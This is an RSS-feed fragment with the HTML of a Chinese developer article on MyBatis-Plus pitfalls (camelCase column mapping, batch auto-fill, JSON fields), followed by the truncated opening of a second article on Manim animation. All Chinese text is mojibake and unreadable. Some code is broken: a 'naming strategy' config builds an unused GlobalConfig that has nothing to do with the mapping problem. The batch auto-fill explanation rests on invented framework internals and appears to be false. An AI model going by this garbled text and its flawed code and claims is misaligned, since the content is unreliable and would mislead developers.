<hr/>
<h2 data-id="heading-30">6ã€é©¼å³°è½¬æ¢é”™ä½</h2>
<h3 data-id="heading-31">6.1 é—®é¢˜ç°è±¡</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ•°æ®åº“å­—æ®µï¼šseller_uid, buyer_uid, create_time</span>
<span class="hljs-comment">// å®ä½“ç±»å­—æ®µï¼š</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeroPackage</span> {
    <span class="hljs-keyword">private</span> Long sellerUid;    <span class="hljs-comment">// âœ… æ­£å¸¸æ˜ å°„</span>
    <span class="hljs-keyword">private</span> Long buyerUID;     <span class="hljs-comment">// âŒ æ˜ å°„å¤±è´¥ï¼</span>
    <span class="hljs-keyword">private</span> Date createTime;   <span class="hljs-comment">// âœ… æ­£å¸¸æ˜ å°„</span>
    <span class="hljs-keyword">private</span> String XMLData;    <span class="hljs-comment">// âŒ æ˜ å°„å¤±è´¥ï¼</span>
}
</code></pre>
<h3 data-id="heading-32">6.2 åŸç†</h3>
<p>MyBatis-Plusçš„é©¼å³°è½¬æ¢ç®—æ³•å¯¹è¿ç»­å¤§å†™å¾ˆæ— å¥ˆã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é©¼å³°è½¬æ¢ç®—æ³•ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CamelCaseConverter</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">camelToUnderscore</span><span class="hljs-params">(String camelCase)</span> {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; camelCase.length(); i++) {
            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> camelCase.charAt(i);
            <span class="hljs-keyword">if</span> (Character.isUpperCase(c)) {
                <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) result.append(<span class="hljs-string">'_'</span>);
                result.append(Character.toLowerCase(c));
            } <span class="hljs-keyword">else</span> {
                result.append(c);
            }
        }
        <span class="hljs-keyword">return</span> result.toString();
    }
}

<span class="hljs-comment">// è½¬æ¢ç»“æœï¼š</span>
<span class="hljs-comment">// sellerUid -&gt; seller_uid âœ…</span>
<span class="hljs-comment">// buyerUID -&gt; buyer_u_i_d âŒ (æœŸæœ›: buyer_uid)</span>
<span class="hljs-comment">// XMLData -&gt; x_m_l_data âŒ (æœŸæœ›: xml_data)</span>
</code></pre>
<h3 data-id="heading-33">6.3 è§£å†³æ–¹æ¡ˆï¼šæ˜ç¡®å­—æ®µæ˜ å°„</h3>
<h5 data-id="heading-34">æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨@TableFieldæ³¨è§£</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeroPackage</span> {
    <span class="hljs-keyword">private</span> Long sellerUid;
    
    <span class="hljs-meta">@TableField("buyer_uid")</span>  <span class="hljs-comment">// æ˜ç¡®æŒ‡å®šæ•°æ®åº“å­—æ®µå</span>
    <span class="hljs-keyword">private</span> Long buyerUID;
    
    <span class="hljs-keyword">private</span> Date createTime;
    
    <span class="hljs-meta">@TableField("xml_data")</span>
    <span class="hljs-keyword">private</span> String XMLData;
}
</code></pre>
<h5 data-id="heading-35">æ–¹æ¡ˆäºŒï¼šç»Ÿä¸€å‘½åè§„èŒƒ</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ¨èçš„å‘½åè§„èŒƒ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeroPackage</span> {
    <span class="hljs-keyword">private</span> Long sellerUid;     <span class="hljs-comment">// é©¼å³°å‘½åï¼Œé¿å…è¿ç»­å¤§å†™</span>
    <span class="hljs-keyword">private</span> Long buyerUid;      <span class="hljs-comment">// è€Œä¸æ˜¯buyerUID</span>
    <span class="hljs-keyword">private</span> Date createTime;
    <span class="hljs-keyword">private</span> String xmlData;     <span class="hljs-comment">// è€Œä¸æ˜¯XMLData</span>
}
</code></pre>
<h5 data-id="heading-36">æ–¹æ¡ˆä¸‰ï¼šè‡ªå®šä¹‰å‘½åç­–ç•¥</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();
        
        <span class="hljs-comment">// è‡ªå®šä¹‰å‘½åç­–ç•¥</span>
        <span class="hljs-type">GlobalConfig</span> <span class="hljs-variable">globalConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GlobalConfig</span>();
        globalConfig.setDbConfig(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GlobalConfig</span>.DbConfig() {{
            <span class="hljs-comment">// è‡ªå®šä¹‰å­—æ®µå‘½åç­–ç•¥</span>
            setColumnFormat(<span class="hljs-string">"`%s`"</span>); <span class="hljs-comment">// å­—æ®µååŠ åå¼•å·ï¼Œé¿å…å…³é”®å­—å†²çª</span>
            setTableFormat(<span class="hljs-string">"`%s`"</span>);  <span class="hljs-comment">// è¡¨ååŠ åå¼•å·</span>
        }});
        
        <span class="hljs-keyword">return</span> interceptor;
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-37">7ã€æ‰¹é‡æ“ä½œæ—¶è‡ªåŠ¨å¡«å……å¤±æ•ˆ</h2>
<h3 data-id="heading-38">7.1 é—®é¢˜ç°è±¡</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®ä½“ç±»é…ç½®</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeroOrder</span> {
    <span class="hljs-meta">@TableField(fill = FieldFill.INSERT)</span>
    <span class="hljs-keyword">private</span> Date createTime;
    
    <span class="hljs-meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span>  
    <span class="hljs-keyword">private</span> Date updateTime;
    
    <span class="hljs-meta">@TableField(fill = FieldFill.INSERT)</span>
    <span class="hljs-keyword">private</span> Long createBy;
}

<span class="hljs-comment">// è‡ªåŠ¨å¡«å……å¤„ç†å™¨</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMetaObjectHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MetaObjectHandler</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertFill</span><span class="hljs-params">(MetaObject metaObject)</span> {
        <span class="hljs-built_in">this</span>.strictInsertFill(metaObject, <span class="hljs-string">"createTime"</span>, Date.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());
        <span class="hljs-built_in">this</span>.strictInsertFill(metaObject, <span class="hljs-string">"createBy"</span>, Long.class, getCurrentUserId());
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateFill</span><span class="hljs-params">(MetaObject metaObject)</span> {
        <span class="hljs-built_in">this</span>.strictUpdateFill(metaObject, <span class="hljs-string">"updateTime"</span>, Date.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());
    }
}

<span class="hljs-comment">// é—®é¢˜ç°è±¡ï¼šæ‰¹é‡æ“ä½œæ—¶è‡ªåŠ¨å¡«å……å¤±æ•ˆï¼</span>
List&lt;HeroOrder&gt; orders = buildOrders();
heroOrderService.saveBatch(orders); <span class="hljs-comment">// createTimeå’ŒcreateByä¸ºnullï¼</span>
</code></pre>
<h3 data-id="heading-39">7.2 åŸç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// MyBatis-Plusçš„è‡ªåŠ¨å¡«å……æœºåˆ¶</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultSqlSession</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(String statement, Object parameter)</span> {
        <span class="hljs-comment">// åªæœ‰é€šè¿‡MyBatis-Plusçš„insertæ–¹æ³•æ‰ä¼šè§¦å‘è‡ªåŠ¨å¡«å……</span>
        <span class="hljs-keyword">if</span> (parameter <span class="hljs-keyword">instanceof</span> BaseEntity) {
            metaObjectHandler.insertFill(parameter); <span class="hljs-comment">// è§¦å‘å¡«å……</span>
        }
        <span class="hljs-keyword">return</span> executor.update(statement, parameter);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">update</span><span class="hljs-params">(String statement, Object parameter)</span> {
        <span class="hljs-keyword">if</span> (parameter <span class="hljs-keyword">instanceof</span> BaseEntity) {
            metaObjectHandler.updateFill(parameter); <span class="hljs-comment">// è§¦å‘å¡«å……</span>
        }
        <span class="hljs-keyword">return</span> executor.update(statement, parameter);
    }
}

<span class="hljs-comment">// ä½†æ˜¯æ‰¹é‡æ“ä½œä½¿ç”¨çš„æ˜¯JDBCæ‰¹å¤„ç†</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveBatch</span><span class="hljs-params">(Collection&lt;T&gt; entityList)</span> {
    <span class="hljs-comment">// ç›´æ¥æ‰§è¡Œæ‰¹é‡SQLï¼Œè·³è¿‡äº†è‡ªåŠ¨å¡«å……é€»è¾‘ï¼</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"INSERT INTO table VALUES (?,?,?)"</span>;
    <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">ps</span> <span class="hljs-operator">=</span> connection.prepareStatement(sql);
    <span class="hljs-keyword">for</span> (T entity : entityList) {
        <span class="hljs-comment">// æ²¡æœ‰è°ƒç”¨metaObjectHandler.insertFill()</span>
        ps.setObject(<span class="hljs-number">1</span>, entity.getId());
        ps.setObject(<span class="hljs-number">2</span>, entity.getName());
        ps.addBatch();
    }
    ps.executeBatch();
}
</code></pre>
<h3 data-id="heading-40">7.3 è§£å†³æ–¹æ¡ˆï¼šæ‰‹åŠ¨å¡«å…… + æ‰¹é‡ä¼˜åŒ–</h3>
<h5 data-id="heading-41">æ–¹æ¡ˆä¸€ï¼šæ‰¹é‡æ“ä½œå‰æ‰‹åŠ¨å¡«å……</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EnhancedOrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> MyMetaObjectHandler metaObjectHandler;
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">saveBatchWithFill</span><span class="hljs-params">(Collection&lt;HeroOrder&gt; entityList)</span> {
        <span class="hljs-comment">// æ‰‹åŠ¨è§¦å‘è‡ªåŠ¨å¡«å……</span>
        entityList.forEach(entity -&gt; {
            <span class="hljs-type">MetaObject</span> <span class="hljs-variable">metaObject</span> <span class="hljs-operator">=</span> SystemMetaObject.forObject(entity);
            metaObjectHandler.insertFill(metaObject);
        });
        
        <span class="hljs-comment">// ç„¶åæ‰§è¡Œæ‰¹é‡ä¿å­˜</span>
        <span class="hljs-keyword">return</span> heroOrderService.saveBatch(entityList);
    }
}
</code></pre>
<h5 data-id="heading-42">æ–¹æ¡ˆäºŒï¼šè‡ªå®šä¹‰æ‰¹é‡ä¿å­˜æ–¹æ³•</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BatchSaveHelper</span> {
    
    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-type">boolean</span> <span class="hljs-title function_">saveBatchWithAutoFill</span><span class="hljs-params">(Collection&lt;T&gt; entityList, 
                                           Class&lt;T&gt; entityClass,
                                           BaseMapper&lt;T&gt; mapper)</span> {
        <span class="hljs-keyword">if</span> (entityList.isEmpty()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        
        <span class="hljs-comment">// è·å–å½“å‰ç”¨æˆ·å’Œæ—¶é—´</span>
        <span class="hljs-type">Long</span> <span class="hljs-variable">currentUserId</span> <span class="hljs-operator">=</span> getCurrentUserId();
        <span class="hljs-type">Date</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
        
        <span class="hljs-comment">// åå°„è®¾ç½®è‡ªåŠ¨å¡«å……å­—æ®µ</span>
        entityList.forEach(entity -&gt; {
            <span class="hljs-keyword">try</span> {
                setFieldValue(entity, <span class="hljs-string">"createTime"</span>, now);
                setFieldValue(entity, <span class="hljs-string">"updateTime"</span>, now);
                setFieldValue(entity, <span class="hljs-string">"createBy"</span>, currentUserId);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                log.warn(<span class="hljs-string">"è‡ªåŠ¨å¡«å……å¤±è´¥"</span>, e);
            }
        });
        
        <span class="hljs-comment">// åˆ†æ‰¹ä¿å­˜ï¼Œé¿å…SQLè¿‡é•¿</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">batchSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;
        List&lt;T&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(entityList);
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; list.size(); i += batchSize) {
            List&lt;T&gt; batch = list.subList(i, Math.min(i + batchSize, list.size()));
            mapper.insertBatch(batch); <span class="hljs-comment">// è‡ªå®šä¹‰æ‰¹é‡æ’å…¥æ–¹æ³•</span>
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> 
            <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(<span class="hljs-literal">true</span>);
        <span class="hljs-keyword">if</span> (field.get(obj) == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// åªæœ‰ä¸ºnullæ—¶æ‰è®¾ç½®</span>
            field.set(obj, value);
        }
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-43">8ã€å†™å…¥æ—¶JSONæ•°æ®ä¸¢å¤±æˆ–æ ¼å¼å¼‚å¸¸</h2>
<h3 data-id="heading-44">8.1 é—®é¢˜ç°è±¡</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®ä½“ç±»å®šä¹‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeroPackage</span> {
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String packageName;
    
    <span class="hljs-comment">// JSONå­—æ®µå­˜å‚¨æ‰©å±•å±æ€§</span>
    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; extendInfo;
    <span class="hljs-keyword">private</span> List&lt;String&gt; tags;
}

<span class="hljs-comment">// ä¿å­˜æ•°æ®</span>
<span class="hljs-type">HeroPackage</span> <span class="hljs-variable">pkg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeroPackage</span>();
pkg.setExtendInfo(Map.of(<span class="hljs-string">"color"</span>, <span class="hljs-string">"çº¢è‰²"</span>, <span class="hljs-string">"weight"</span>, <span class="hljs-number">1.5</span>));
pkg.setTags(Arrays.asList(<span class="hljs-string">"ç”µå­äº§å“"</span>, <span class="hljs-string">"äºŒæ‰‹"</span>, <span class="hljs-string">"9æˆæ–°"</span>));
heroPackageService.save(pkg);

<span class="hljs-comment">// æŸ¥è¯¢ç»“æœï¼šextendInfoå’Œtagså­—æ®µä¸ºnullï¼</span>
</code></pre>
<h3 data-id="heading-45">8.2 åŸç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// MyBatisé»˜è®¤åªèƒ½å¤„ç†åŸºæœ¬ç±»å‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultTypeHandlerRegistry</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultTypeHandlerRegistry</span><span class="hljs-params">()</span> {
        register(String.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringTypeHandler</span>());
        register(Integer.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntegerTypeHandler</span>());
        register(Long.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LongTypeHandler</span>());
        <span class="hljs-comment">// æ²¡æœ‰Mapå’ŒListçš„å¤„ç†å™¨ï¼</span>
    }
}

<span class="hljs-comment">// å¤æ‚å¯¹è±¡ä¼šè¢«toString()å¤„ç†</span>
Map&lt;String, Object&gt; map = Map.of(<span class="hljs-string">"key"</span>, <span class="hljs-string">"value"</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> map.toString(); <span class="hljs-comment">// "{key=value}" - ä¸æ˜¯æ ‡å‡†JSONï¼</span>
</code></pre>
<h3 data-id="heading-46">8.3 è§£å†³æ–¹æ¡ˆï¼šæ•°æ®ç±»å‹è§„èŒƒåŒ–å¤„ç†</h3>
<p>æˆ‘ä»¬çš„å…±è¯†æ˜¯ï¼šèƒ½ä¸ç”¨å¤æ‚å­—æ®µå°±åˆ«ç”¨ã€‚å¦‚æœå¿…é¡»ç”¨ï¼Œå°±è‡ªå·±ç®¡åºåˆ—åŒ–ã€‚</p>
<h5 data-id="heading-47">æ–¹æ¡ˆä¸€ï¼šæ•°æ®åº“å­—æ®µç±»å‹è§„èŒƒåŒ–</h5>
<ul>
<li>è¡¨é‡Œå°½é‡åªæ”¾åŸºæœ¬ç±»å‹</li>
<li>Mapã€Listå…ˆæ‹†æˆå…·ä½“å­—æ®µï¼Œæˆ–è€…è½¬æˆç‹¬ç«‹è¡¨</li>
<li>å¤æ‚åœºæ™¯åœ¨ä¸šåŠ¡å±‚å¤„ç†è½¬æ¢</li>
</ul>
<h5 data-id="heading-48">æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨åºåˆ—åŒ–å¤„ç†</h5>
<ul>
<li>ç¡®å®éœ€è¦å­˜ç»“æ„åŒ–æ•°æ®æ—¶ï¼Œå…ˆåºåˆ—åŒ–æˆJSONå­—ç¬¦ä¸²</li>
<li>å­˜å…¥VARCHARæˆ–TEXT</li>
<li>æŸ¥è¯¢æ—¶å†ååºåˆ—åŒ–</li>
</ul>
<p><strong>å®æ–½å»ºè®®</strong>ï¼š
ä¼˜å…ˆèµ°æ–¹æ¡ˆä¸€ã€‚åªæœ‰åœ¨ä¸šåŠ¡å¼ºä¾èµ–åŠ¨æ€ç»“æ„æ—¶ï¼Œå†è€ƒè™‘æ–¹æ¡ˆäºŒï¼Œè®°å¾—å°è£…å¥½åºåˆ—åŒ–é€»è¾‘ï¼Œåˆ«æŠŠJSONå·¥å…·æ•£è½åœ¨ä¸šåŠ¡ä»£ç é‡Œã€‚</p>
<hr/>
<h2 data-id="heading-49">æ€»ç»“ä¸æ€è€ƒ</h2>
<p>ç§ç§æ¡ˆä¾‹éƒ½åœ¨æé†’æˆ‘ä»¬ï¼š<strong>æ¡†æ¶é»˜è®¤å€¼æ˜¯ç»™ç†æƒ³ç¯å¢ƒå‡†å¤‡çš„ï¼Œåˆ°äº†ç”Ÿäº§å°±å¾—é‡æ–°å®¡è§†</strong>ã€‚å¦‚æœä¸äº†è§£å†…éƒ¨æœºåˆ¶ï¼Œå°±å¾ˆå®¹æ˜“æ‰è¿›å‘é‡Œã€‚</p>
<p><strong>å¯ç¤ºä¸€ï¼šé»˜è®¤é…ç½®é ä¸ä½</strong><br/>
å¼€å‘ç¯å¢ƒé€šå¸¸æ˜¯å•æœºã€ä½å¹¶å‘ï¼Œé»˜è®¤é…ç½®è‡ªç„¶æ²¡é—®é¢˜ã€‚å¯ä¸€ä¸Šç”Ÿäº§ï¼Œå®¹å™¨åŒ–ã€åˆ†å¸ƒå¼ã€é«˜å¹¶å‘é½èšï¼Œé»˜è®¤å€¼ç¬é—´å˜æˆéšæ‚£ã€‚<strong>åˆ«æŒ‡æœ›æ¡†æ¶â€œè‡ªåŠ¨â€å¤„ç†æ‰€æœ‰è¾¹è§’æ–™</strong>ã€‚</p>
<p><strong>å¯ç¤ºäºŒï¼šæœºåˆ¶ç†è§£å°‘ä¸äº†</strong><br/>
åªæœ‰ææ¸…æ¥šæ¡†æ¶æ€ä¹ˆè¿è½¬ï¼Œæ‰èƒ½æå‰å‘ç°é£é™©ï¼›çœŸå‡ºäº‹æ—¶ï¼Œä¹Ÿèƒ½å¿«é€Ÿå®šä½ã€‚<strong>çŸ¥å…¶ç„¶è€Œä¸”è¦çŸ¥å…¶æ‰€ä»¥ç„¶</strong>ã€‚</p>
<p><strong>å¯ç¤ºä¸‰ï¼šæ–¹æ¡ˆè¦æœåŠ¡äºç¯å¢ƒ</strong><br/>
ä½ åœ¨ä»€ä¹ˆç¯å¢ƒé‡Œè·‘ï¼Œå°±å¾—é…ä»€ä¹ˆç­–ç•¥ã€‚å®¹å™¨ã€K8sã€äº‘åŸç”Ÿéƒ½åœ¨æŒ‘æˆ˜æ—§æœ‰å‡è®¾ã€‚<strong>æ²¡æœ‰é“¶å¼¹ï¼Œåªæœ‰é€‚é…</strong>ã€‚</p>
<blockquote>
<p>å…³äºä½œè€…ï¼Œæœ±æ´ªæ—­ï¼Œä¾ å®¢æ±‡Javaå¼€å‘å·¥ç¨‹å¸ˆã€‚</p>
</blockquote>
<blockquote>
<p>è½¬è½¬ç ”å‘ä¸­å¿ƒåŠä¸šç•Œå°ä¼™ä¼´ä»¬çš„æŠ€æœ¯å­¦ä¹ äº¤æµå¹³å°ï¼Œå®šæœŸåˆ†äº«ä¸€çº¿çš„å®æˆ˜ç»éªŒåŠä¸šç•Œå‰æ²¿çš„æŠ€æœ¯è¯é¢˜ã€‚
å…³æ³¨å…¬ä¼—å·ã€Œè½¬è½¬æŠ€æœ¯ã€ï¼ˆç»¼åˆæ€§ï¼‰ã€ã€Œå¤§è½¬è½¬FEã€ï¼ˆä¸“æ³¨äºFEï¼‰ã€ã€Œè½¬è½¬QAã€ï¼ˆä¸“æ³¨äºQAï¼‰ï¼Œæ›´å¤šå¹²è´§å®è·µï¼Œæ¬¢è¿äº¤æµåˆ†äº«~</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®©ä½ çš„åŠ¨ç”»â€œæ´»â€è¿‡æ¥ï¼šManim èŠ‚å¥æ§åˆ¶æŒ‡å— (Rate Functions)]]></title>    <link>https://juejin.cn/post/7575313772988186665</link>    <guid>https://juejin.cn/post/7575313772988186665</guid>    <pubDate>2025-11-23T06:27:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575313772988186665" data-draft-id="7575442779038548010" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®©ä½ çš„åŠ¨ç”»â€œæ´»â€è¿‡æ¥ï¼šManim èŠ‚å¥æ§åˆ¶æŒ‡å— (Rate Functions)"/> <meta itemprop="keywords" content="Python,åŠ¨æ•ˆ,åç«¯"/> <meta itemprop="datePublished" content="2025-11-23T06:27:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="databook"/> <meta itemprop="url" content="https://juejin.cn/user/3526889035006702"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®©ä½ çš„åŠ¨ç”»â€œæ´»â€è¿‡æ¥ï¼šManim èŠ‚å¥æ§åˆ¶æŒ‡å— (Rate Functions)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3526889035006702/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    databook
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T06:27:44.000Z" title="Sun Nov 23 2025 06:27:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 